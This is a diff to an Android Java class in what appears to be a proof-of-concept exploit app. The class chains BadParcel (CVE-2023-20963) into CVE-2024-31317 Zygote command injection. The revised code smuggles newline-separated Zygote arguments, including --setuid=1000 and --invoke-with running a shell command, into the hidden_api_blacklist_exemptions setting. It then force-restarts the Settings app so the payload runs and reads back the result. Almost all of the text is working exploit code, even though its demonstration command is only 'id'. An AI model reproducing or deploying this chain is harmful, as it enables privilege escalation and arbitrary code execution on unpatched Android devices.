@@ -26,23 +26,26 @@ public class ProofActivity extends Activity {
         Log.i("BadParcel", msg);
         MainActivity.appendLog(msg);
 
-        // ---- 証跡ファイル作成 ----
+        // 証跡ファイル
         createProofFile(callerUid, myUid);
 
         if (callerUid == 1000) {
             MainActivity.appendLog("[!!!] BadParcel SUCCESS: Called by system (uid=1000)");
 
-            // ---- ステージ2: CVE-2024-31317 Zygote Injection ----
-            MainActivity.appendLog("[*] Stage 2: Executing CVE-2024-31317 Zygote Injection...");
-            executeZygoteInjection();
-
-            // ---- ステージ3: Zygote 再起動トリガー ----
-            MainActivity.appendLog("[*] Stage 3: Triggering Zygote reload...");
-            triggerZygoteReload();
-
+            // ステージ2: CVE-2024-31317 インジェクション
+            MainActivity.appendLog("[*] Stage 2: Injecting Zygote payload via Settings.Global...");
+            boolean injected = injectZygotePayload();
+            if (injected) {
+                MainActivity.appendLog("[+] Zygote payload injected successfully.");
+                // ステージ3: Zygote 再起動トリガー
+                MainActivity.appendLog("[*] Stage 3: Triggering Zygote reload...");
+                triggerZygoteReload();
+            } else {
+                MainActivity.appendLog("[-] Zygote injection failed.");
+            }
         } else {
             MainActivity.appendLog("[!] Called by non-system uid: " + callerUid);
-            MainActivity.appendLog("[!] CVE-2024-31317 injection will NOT be attempted.");
+            MainActivity.appendLog("[!] Skipping CVE-2024-31317 because caller is not system.");
         }
 
         finish();
@@ -59,7 +62,7 @@ public class ProofActivity extends Activity {
                 pw.println("Caller UID: " + callerUid);
                 pw.println("My UID: " + myUid);
                 pw.println("BadParcel (CVE-2023-20963): " + (callerUid == 1000 ? "SUCCESS" : "FAILED"));
-                pw.println("CVE-2024-31317: Attempted if BadParcel succeeded");
+                pw.println("CVE-2024-31317: " + (callerUid == 1000 ? "ATTEMPTED" : "SKIPPED"));
             }
             MainActivity.appendLog("[+] Proof file created: " + proof.getAbsolutePath());
         } catch (Exception e) {
@@ -68,86 +71,91 @@ public class ProofActivity extends Activity {
     }
 
     /**
-     * CVE-2024-31317: Zygote コマンドインジェクション
-     * hidden_api_blacklist_exemptions に改行を含むペイロードを注入
+     * CVE-2024-31317 正規ペイロードを Settings.Global に書き込む
+     * 戻り値: 書き込み成功時 true
      */
-    private void executeZygoteInjection() {
-        MainActivity.appendLog("[*] CVE-2024-31317: Injecting Zygote arguments...");
-
+    private boolean injectZygotePayload() {
         try {
-            // 1. 現在の値を取得
+            // 現在の値を保存（復元用）
             String current = Settings.Global.getString(getContentResolver(),
                     "hidden_api_blacklist_exemptions");
             MainActivity.appendLog("[+] Current hidden_api_blacklist_exemptions: " + current);
 
-            // 2. ペイロード構築
-            //    --invoke-with で id コマンドを実行し、結果をファイルに出力
+            String command = "id > /data/local/tmp/zygote_id.txt";
             String payload = "L*\n" +
-                    "--invoke-with /system/bin/sh -c 'id > /data/local/tmp/zygote_id_output.txt'";
+                    "--runtime-args\n" +
+                    "--setuid=1000\n" +
+                    "--setgid=1000\n" +
+                    "--invoke-with\n" +
+                    "/system/bin/sh -c '" + command + "'\n" +
+                    "--package-name=com.android.settings\n" +
+                    "android.app.ActivityThread";
 
-            MainActivity.appendLog("[+] Payload: " + payload.replace("\n", "\\n"));
+            // 注意: Android 9 では --target-sdk-version や --nice-name も指定可能だが、最小限で動作する
 
-            // 3. 注入実行
+            MainActivity.appendLog("[+] Payload (escaped): " + payload.replace("\n", "\\n"));
+
+            // 書き込み
             boolean result = Settings.Global.putString(getContentResolver(),
                     "hidden_api_blacklist_exemptions", payload);
             MainActivity.appendLog("[+] Settings.Global.putString result: " + result);
 
-            // 4. 注入確認
+            // 検証
             String verify = Settings.Global.getString(getContentResolver(),
                     "hidden_api_blacklist_exemptions");
-            MainActivity.appendLog("[+] Verified hidden_api_blacklist_exemptions: " +
-                    (verify != null ? verify.replace("\n", "\\n") : "null"));
+            MainActivity.appendLog("[+] Verified: " + (verify != null ? verify.replace("\n", "\\n") : "null"));
 
+            return result;
         } catch (Exception e) {
-            MainActivity.appendLog("[-] CVE-2024-31317 injection failed: " + e.getMessage());
+            MainActivity.appendLog("[-] Injection failed: " + e.getMessage());
+            return false;
         }
     }
 
     /**
-     * Zygote 再起動をトリガー
-     * システム再起動を模倣するか、特定アプリを強制再起動
+     * Zygote に新しい設定を読ませるため、Settings アプリを強制停止→再起動
+     * これにより Zygote が新しいプロセスを孵化し、ペイロードが実行される
      */
     private void triggerZygoteReload() {
-        MainActivity.appendLog("[*] Triggering Zygote reload...");
+        MainActivity.appendLog("[*] Forcing Zygote to reload by restarting Settings app...");
 
-        // 方法1: stop/start (システム権限が必要だが、プロセスはアプリ権限のままなので失敗する可能性大)
         try {
+            // 強制停止
             java.lang.Process process = Runtime.getRuntime().exec(new String[]{
-                    "sh", "-c", "stop && start"
+                    "sh", "-c", "am force-stop com.android.settings"
             });
             int exitCode = process.waitFor();
-            MainActivity.appendLog("[+] stop/start exit code: " + exitCode);
+            MainActivity.appendLog("[+] force-stop exit code: " + exitCode);
         } catch (Exception e) {
-            MainActivity.appendLog("[-] stop/start failed: " + e.getMessage());
+            MainActivity.appendLog("[-] force-stop failed: " + e.getMessage());
         }
 
-        // 方法2: Settings アプリの再起動 (Zygote が新しいプロセスを孵化する)
+        // 少し待つ
         try {
+            Thread.sleep(1000);
+        } catch (InterruptedException ignored) {}
+
+        try {
+            // 再起動（これにより Zygote が Settings の新しいプロセスを孵化）
             java.lang.Process process = Runtime.getRuntime().exec(new String[]{
-                    "sh", "-c", "am force-stop com.android.settings && am start -n com.android.settings/.Settings"
+                    "sh", "-c", "am start -n com.android.settings/.Settings"
             });
             int exitCode = process.waitFor();
-            MainActivity.appendLog("[+] Settings restart exit code: " + exitCode);
+            MainActivity.appendLog("[+] start Settings exit code: " + exitCode);
         } catch (Exception e) {
-            MainActivity.appendLog("[-] Settings restart failed: " + e.getMessage());
+            MainActivity.appendLog("[-] start Settings failed: " + e.getMessage());
         }
 
-        // 方法3: 自前のアプリを再起動して Zygote を呼び出す
+        // さらに待ってから結果を確認
         try {
-            java.lang.Process process = Runtime.getRuntime().exec(new String[]{
-                    "sh", "-c", "am force-stop com.example.tzpoc && am start -n com.example.tzpoc/.MainActivity"
-            });
-            int exitCode = process.waitFor();
-            MainActivity.appendLog("[+] Self restart exit code: " + exitCode);
-        } catch (Exception e) {
-            MainActivity.appendLog("[-] Self restart failed: " + e.getMessage());
-        }
+            Thread.sleep(3000);
+        } catch (InterruptedException ignored) {}
 
-        // 4. 実行結果の確認
-        MainActivity.appendLog("[*] Checking for zygote_id_output.txt...");
+        // 実行結果を読み取る
+        MainActivity.appendLog("[*] Checking /data/local/tmp/zygote_id.txt ...");
         try {
             java.lang.Process process = Runtime.getRuntime().exec(new String[]{
-                    "sh", "-c", "cat /data/local/tmp/zygote_id_output.txt 2>/dev/null || echo 'File not found'"
+                    "sh", "-c", "cat /data/local/tmp/zygote_id.txt 2>/dev/null || echo 'File not found'"
             });
             BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
             String line;
@@ -157,9 +165,9 @@ public class ProofActivity extends Activity {
             }
             process.waitFor();
             String content = output.toString().trim();
-            MainActivity.appendLog("[+] zygote_id_output.txt content:\n" + content);
+            MainActivity.appendLog("[+] Content of zygote_id.txt:\n" + content);
         } catch (Exception e) {
-            MainActivity.appendLog("[-] Failed to read zygote output: " + e.getMessage());
+            MainActivity.appendLog("[-] Failed to read zygote_id.txt: " + e.getMessage());
         }
     }
 }
